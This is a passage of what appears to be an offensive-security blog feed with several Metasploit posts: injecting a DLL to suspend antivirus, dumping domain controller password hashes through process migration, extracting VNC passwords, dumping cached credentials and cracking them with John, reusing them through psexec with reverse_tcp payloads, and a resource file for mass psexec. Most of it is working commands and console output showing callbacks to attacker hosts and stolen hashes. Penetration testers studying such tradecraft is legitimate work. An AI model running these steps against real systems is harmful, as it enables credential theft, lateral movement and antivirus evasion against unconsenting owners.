&lt;p&gt;Open the process, this time with Rex:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Allocate the memory in the remote process write the payload (not our DLL) into that space:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
targetprocess.memory.write(mem, raw)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;targetprocess.thread.create(mem, 0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And 10 seconds later our AV and all it&amp;rsquo;s children processes stop. Suspended by Didier&amp;rsquo;s Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
      <link>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
+ -- --=[ 687 exploits - 364 auxiliary - 43 post
+ -- --=[ 217 payloads - 27 encoders - 8 nops
       =[ svn r12622 updated today (2011.05.15)

msf &amp;gt; 
[*] DC_IP:49220 Request received for /AYSBk...
[*] DC_IP:49220 Staging connection for target YSBk received...
[*] Patching Target ID YSBk into DLL
[*] DC_IP:49221 Request received for /BYSBk...
[*] DC_IP:49221 Stage connection for target YSBk received...
[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&amp;gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011

msf &amp;gt; sessions -i 7
[*] Starting interaction with 7...

meterpreter &amp;gt; sysinfo
System Language : en_US
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Computer        : DOMAINCONTROLLE
Architecture    : x64 (Current Process is WOW64)
Meterpreter     : x86/win32

meterpreter &amp;gt; ps

Process list
============

 PID   Name                                       Arch  Session  User                          Path
 ---   ----                                       ----  -------  ----                          ----
 0     [System Process]                                                                        
 4     System                                     x64   0                                      
 224   smss.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 324   csrss.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 364   csrss.exe                                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 372   wininit.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 404   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 468   services.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 476   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 484   lsm.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 628   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 708   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 804   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 836   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 880   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 932   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 972   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 328   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1172  spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
 1252  dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 1288  dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 1316  ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 1360  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1392  vmtoolsd.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1464  wlms.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlmswlms.exe
 1492  dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe
 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 2016  vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 872   sppsvc.exe                                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbemWmiPrvSE.exe
 2360  taskhost.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\System32\taskhost.exe
 2424  dwm.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\dwm.exe
 2452  explorer.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\explorer.exe
 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2512  conhost.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\conhost.exe
 2632  VMwareTray.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareTray.exe
 2640  VMwareUser.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareUser.exe
 2716  mmc.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\mmc.exe
 3052  mscorsvw.exe                               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Frameworkv4.0.30319\mscorsvw.exe
 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1932  mscorsvw.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft\.NET\Framework\64\v4.0.30319\mscorsvw.exe
 2564  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1732  msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2992  notepad.exe                                x86   1        SITTINGDUCK\juser             C:\Windows\SysWOW64\notepad.exe
 1720  notepad.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\notepad.exe


meterpreter &amp;gt; getpid
Current pid: 2992

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
============================================================
Enabled Process Privileges
============================================================
  SeDebugPrivilege
  SeIncreaseQuotaPrivilege
  SeMachineAccountPrivilege
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
  SeLoadDriverPrivilege
  SeSystemProfilePrivilege
  SeSystemtimePrivilege
  SeProfileSingleProcessPrivilege
  SeIncreaseBasePriorityPrivilege
  SeCreatePagefilePrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeShutdownPrivilege
  SeSystemEnvironmentPrivilege
  SeChangeNotifyPrivilege
  SeRemoteShutdownPrivilege
  SeUndockPrivilege
  SeEnableDelegationPrivilege
  SeManageVolumePrivilege

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
...got system (via technique 1).

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
[*] Migrating to 1720...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
meterpreter &amp;gt; hashdump 
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
[*] Migrating to 1288...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
Administrator:500:MYLMHASH:MYNTLMHASH:::
Guest:501:MYLMHASH:MYNTLMHASH:::
krbtgtG:502:MYLMHASH:MYNTLMHASH:::
Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
juserN:1104:MYLMHASH:MYNTLMHASH:::
jane.user??:1105:MYLMHASH:MYNTLMHASH:::
DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;

&lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit VNC Password Extraction</title>
      <link>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</link>
      <pubDate>Mon, 21 Mar 2011 02:12:29 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://carnal0wnage.blogspot.com/2011/03/vnc-passwords-and-metasploit-and-des.html&#34;&gt;Chris Gates wrote a blog post&lt;/a&gt; about the &amp;lsquo;getvncpw&amp;rsquo; meterpreter script. I ran into the same issue on Penetration Tests in the past but didn&amp;rsquo;t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn&amp;rsquo;t get a chance to.&lt;/p&gt;

&lt;p&gt;Yesterday I saw this ticket: &lt;a href=&#34;https://www.metasploit.com/redmine/issues/3183&#34;&gt;https://www.metasploit.com/redmine/issues/3183&lt;/a&gt; and thought to myself: &amp;ldquo;Thats definitely within my coding ability to contribute a patch for&amp;rdquo;. After almost 15 hours of coding between 9 pm on Saturday and 8 pm on Sunday. It went far and beyond just adding in a bit of code to support UltraVNC.&lt;/p&gt;

&lt;p&gt;changelog:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Complete rewrite as a post module instead of a meterpreter script&lt;/li&gt;
&lt;li&gt;Passwords of less than 8 characters are correctly padded (&lt;a href=&#34;https://www.metasploit.com/redmine/projects/framework/repository/revisions/12033&#34;&gt;thanks jduck&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;UltraVNC checks added&lt;/li&gt;
&lt;li&gt;TightVNC checks added for both VNC and it&amp;rsquo;s control console&lt;/li&gt;
&lt;li&gt;Made it very simple to add new checks in either the registry or in a file&lt;/li&gt;
&lt;li&gt;Output is a bit more verbose (lets you know something is happening&lt;/li&gt;
&lt;li&gt;Reports authentication credentials found to database&lt;/li&gt;
&lt;li&gt;Identifies the port that VNC is running on as well&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It isn&amp;rsquo;t in the metasploit trunk so until/if if gets added you can get it here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/8215705&#34;&gt;enum_vnc_pw.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you have a check, find it breaks for some reason or another, or just want to tell me that I suck, please leave a comment or email me.&lt;/p&gt;

&lt;p&gt;Here it is in action against my VM with 3 different VNC servers on it (calling the post module in two separate ways) :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf exploit(handler) &amp;gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &amp;gt; getuid
Server username: XPBASELINEAdministrator
meterpreter &amp;gt; background
msf exploit(handler) &amp;gt; use post/windows/gather/enum_vnc_pw 
msf post(enum_vnc_pw) &amp;gt; set SESSION 1
SESSION =&amp;gt; 1
msf post(enum_vnc_pw) &amp;gt; show options

Module options (post/windows/gather/enum_vnc_pw):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf post(enum_vnc_pw) &amp;gt; run

[*] Enumerating VNC passwords on XPBASELINE
[*] Checking UltraVNC...
[+] UltraVNC =&amp;gt; A85B4C5976979DE93B =&amp;gt; thisismy on port: 5900
[+] VIEW ONLY: UltraVNC =&amp;gt; DE2C1BA7393F6708B3 =&amp;gt; 111 on port: 5900
[*] Checking WinVNC3_HKLM...
[*] Checking WinVNC3_HKCU...
[*] Checking WinVNC3_HKLM_Default...
[*] Checking WinVNC3_HKCU_Default...
[*] Checking WinVNC_HKLM_Default...
[*] Checking WinVNC_HKCU_Default...
[*] Checking WinVNC4_HKLM...
[+] WinVNC4_HKLM =&amp;gt; c777b2de337a91cf =&amp;gt; mypasswo on port: 5900
[*] Checking WinVNC4_HKCU...
[*] Checking RealVNC_HKLM...
[*] Checking RealVNC_HKCU...
[*] Checking TightVNC_HKLM...
[+] TightVNC_HKLM =&amp;gt; 7ebf1e76f732459f =&amp;gt; authpass on port: 5900
[*] Checking TightVNC_HKLM_Control_pass...
[+] TightVNC_HKLM_Control_pass =&amp;gt; f0299fd0e927cf2f =&amp;gt; adminpas on port: 5900
[*] Post module execution completed

msf post(enum_vnc_pw) &amp;gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &amp;gt; run post/windows/gather/enum_vnc_pw 

[*] Enumerating VNC passwords on XPBASELINE
[*] Checking UltraVNC...
[+] UltraVNC =&amp;gt; A85B4C5976979DE93B =&amp;gt; thisismy on port: 5900
[+] VIEW ONLY: UltraVNC =&amp;gt; DE2C1BA7393F6708B3 =&amp;gt; 111 on port: 5900
[*] Checking WinVNC3_HKLM...
[*] Checking WinVNC3_HKCU...
[*] Checking WinVNC3_HKLM_Default...
[*] Checking WinVNC3_HKCU_Default...
[*] Checking WinVNC_HKLM_Default...
[*] Checking WinVNC_HKCU_Default...
[*] Checking WinVNC4_HKLM...
[+] WinVNC4_HKLM =&amp;gt; c777b2de337a91cf =&amp;gt; mypasswo on port: 5900
[*] Checking WinVNC4_HKCU...
[*] Checking RealVNC_HKLM...
[*] Checking RealVNC_HKCU...
[*] Checking TightVNC_HKLM...
[+] TightVNC_HKLM =&amp;gt; 7ebf1e76f732459f =&amp;gt; authpass on port: 5900
[*] Checking TightVNC_HKLM_Control_pass...
[+] TightVNC_HKLM_Control_pass =&amp;gt; f0299fd0e927cf2f =&amp;gt; adminpas on port: 5900
meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Cachedump for Meterpreter in action</title>
      <link>https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/</link>
      <pubDate>Mon, 14 Feb 2011 22:03:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Cachedump has been added to the Metasploit trunk:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946&#34;&gt;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pull it down:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget http://lab.mediaservice.net/code/cachedump.rb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;put it here:  &lt;code&gt;/(metasploitdir)/modules/post/windows/gather&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/cachedump
[*] Executing module against WORKSTATION244
[*] Obtaining the boot key...
[*] Trying &#39;XP&#39; style...
[*] Getting PolSecretEncryptionKey...
[*] XP compatible client
[*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c
[*] Getting LK$KM...
[*] Dumping cached credentials...
Username  : jdoe
Hash  : 592cdfbc3f1ef77ae95c75f851e37166
Last login  : 2010-05-11 01:43:48
DNS Domain Name  : CONTOSO.CO
Effective Name  : jdo
Full Name  : eJane Do
User ID  : 1107
Primary Group ID  : 513
Additional groups  : 33620069 33554432 34013184
Logon domain name  : CONTOS
----------------------------------------------------------------------
 
[*] John the Ripper format:
jdoe:592cdfbc3f1ef77ae95c75f851e37166:CONTOSO.CO:CONTOS

[*] Hash are in MSCACHE format. (mscash)
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Crack it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat lab.dic | ./john --stdin lab.mscash --format=mscash --pot=lab.pot  
Loaded 1 password hash (M$ Cache Hash [Generic 1x])  
ASDqwe123  (jdoe)  
guesses: 1  time: 0:00:00:00  c/s: 500  trying: ASDqwe123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Use it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; background  
msf exploit(handler) &amp;gt; route add 10.10.10.0 255.255.255.0 1  
msf exploit(handler) &amp;gt; use exploit/windows/smb/psexec  
msf exploit(psexec) &amp;gt; set PAYLOAD windows/meterpreter/reverse_tcp  
PAYLOAD =&amp;gt; windows/meterpreter/reverse_tcp  
msf exploit(psexec) &amp;gt; set LHOST X.X.X.X  
LHOST =&amp;gt; X.X.X.X  
msf exploit(psexec) &amp;gt; set LPORT 80  
LPORT =&amp;gt; 80  
msf exploit(psexec) &amp;gt; set SMBDomain Contoso
SMBDomain =&amp;gt; Contoso  
msf exploit(psexec) &amp;gt; set SMBUser jdoe  
SMBUser =&amp;gt; jdoe  
msf exploit(psexec) &amp;gt; set SMBPass ASDqwe123  
SMBPass =&amp;gt; ASDqwe123  
msf exploit(psexec) &amp;gt; show options

Module options (exploit/windows/smb/psexec):

Name  Current Setting  Required  Description  
----  ---------------  --------  -----------  
RHOST  yes  The target address  
RPORT  445  yes  Set the SMB service port  
SMBDomain  Contoso  no  The Windows domain to use for authentication  
SMBPass  ASDqwe123  no  The password for the specified username  
SMBUser  jdoe  no  The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):


Name  Current Setting  Required  Description  
----  ---------------  --------  -----------  
EXITFUNC  process  yes  Exit technique: seh, thread, none, process  
LHOST  X.X.X.X  yes  The listen address  
LPORT  80  yes  The listen port


Exploit target:

Id  Name  
--  ----  
0  Automatic

 
msf exploit(psexec) &amp;gt; set RHOST 10.10.10.200  
RHOST =&amp;gt; 10.10.10.200  
msf exploit(psexec) &amp;gt; exploit

[*] Started reverse handler on X.X.X.X:80  
[*] Connecting to the server...  
[*] Authenticating to 10.10.10.200:445|Contoso as user &#39;jdoe&#39;...  
[*] Uploading payload...  
[*] Created jSlxARUj.exe...  
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ...  
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ...  
[*] Obtaining a service manager handle...  
[*] Creating a new service (SyHtwKpn - &amp;quot;MbEXNupOpYUL&amp;quot;)...  
[*] Closing service handle...  
[*] Opening service...  
[*] Starting the service...  
[*] Removing the service...  
[*] Closing service handle...  
[*] Deleting jSlxARUj.exe...  
[*] Meterpreter session 2 opened (X.X.X.X:80 -&amp;gt; X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Woot ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Silently uninstall SEP</title>
      <link>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</link>
      <pubDate>Tue, 16 Nov 2010 05:00:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</guid>
      <description>&lt;p&gt;Uninstallation is not new&lt;/p&gt;

&lt;p&gt;Deleting and removing things on a box you own isn&amp;rsquo;t new&lt;/p&gt;

&lt;p&gt;This method and how to do it remotely was &lt;a href=&#34;http://it.toolbox.com/blogs/locutus/how-to-silently-and-remotely-remove-symantec-antivirus-14625&#34;&gt;posted in Feb 2007&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But I didn&amp;rsquo;t know how to do it, and I thought it was hilarious, so I made a video:&lt;/p&gt;

&lt;iframe width=&#34;420&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/tkoApCp8rQ4&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Am I an Admin? Railgun Script</title>
      <link>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</link>
      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</guid>
      <description>&lt;p&gt;When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.&lt;/p&gt;

&lt;p&gt;But, I wanted to make a way that check a bunch of sessions all at once. So I wrote &amp;ldquo;AmIAdmin.rb&amp;rdquo; which uses meterpreter&amp;rsquo;s railgun extension to execute &amp;ldquo;IsUserAdmin&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Being that Shell32.dll isn&amp;rsquo;t included in railgun by default we have to add it. After writing it I decided to add some checks. These checks make sure that each piece of the script isn&amp;rsquo;t already loaded. It&amp;rsquo;s a good reference for doing this in the future.&lt;/p&gt;

&lt;p&gt;(you can remove the print_status lines if you want the script to be quieter)&lt;/p&gt;

&lt;p&gt;Here is the script for your consumption:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;if client.platform == &amp;quot;x64/win32&amp;quot;        
	print_status &amp;quot;Railgun is currently not supported for x64 bit systems&amp;quot;         
raise Rex::Script::Completed        
end

if client.railgun.present? == true       
	print_status &amp;quot;Railgun already loaded.. skipping&amp;quot;         
else        
	print_status &amp;quot;Loading Railgun&amp;quot;         
	client.core.use(&amp;quot;railgun&amp;quot;)        
end

if client.railgun.dll[&#39;shell32&#39;] == nil       
	print_status &amp;quot;Adding Shell32.dll&amp;quot;         
	client.railgun.add_dll(&#39;shell32&#39;,&#39;shell32&#39;)        
else        
	print_status &amp;quot;Shell32 already loaded.. skipping&amp;quot;         
end

if (client.railgun.shell32.functions[&#39;IsUserAnAdmin&#39;] == nil       
	print_status &amp;quot;Adding the IsUserAnAdmin function&amp;quot;         
	client.railgun.add_function(&#39;shell32&#39;, &#39;IsUserAnAdmin&#39;, &#39;BOOL&#39;, [])        
else        
	print_status &amp;quot;IsUserAnAdmin already loaded.. skipping&amp;quot;         
end

print_status &amp;quot;Running the IsUserAnAdmin function&amp;quot;        
status = client.railgun.shell32.IsUserAnAdmin()

if status[&amp;quot;return&amp;quot;] == true then       
	print_status &amp;quot;You are an administrator&amp;quot;         
else        
	print_error &amp;quot;You are not an administrator&amp;quot;         
end
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Rapid fire PSEXEC for Metasploit</title>
      <link>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</link>
      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</guid>
      <description>&lt;p&gt;Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.&lt;/p&gt;

&lt;p&gt;// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections. Also take note of the &amp;ldquo;setg&amp;rdquo; which sets the variable globally so that I don&amp;rsquo;t have to set it inside of the psexec module.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use multi/handler  
setg PAYLOAD windows/meterpreter/reverse_tcp  
setg LHOST 192.168.1.114  
setg LPORT 80  
set ExitOnSession false

exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&amp;rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use windows/smb/psexec  
set SMBUser Administrator  
set SMBPass password123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&amp;rsquo;t joined to a domain they can take pretty much anything here.&lt;/p&gt;

&lt;p&gt;However if they are actually joined to a domain, you either have to have the computer name (which definitely won&amp;rsquo;t play well with a scanner easily) or use domain credentials.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;set SMBDomain .
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &amp;ldquo;.&amp;rdquo; is something every Windows API programmer would know as it&amp;rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&amp;rsquo;t take either localhost or 127.0.0.1.&lt;/p&gt;

&lt;p&gt;Next up, we don&amp;rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&amp;rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;set DisablePayloadHandler true
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the &lt;code&gt;&amp;lt;ruby&amp;gt;&lt;/code&gt; html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&amp;rsquo;s API) to do really cool stuff.&lt;/p&gt;

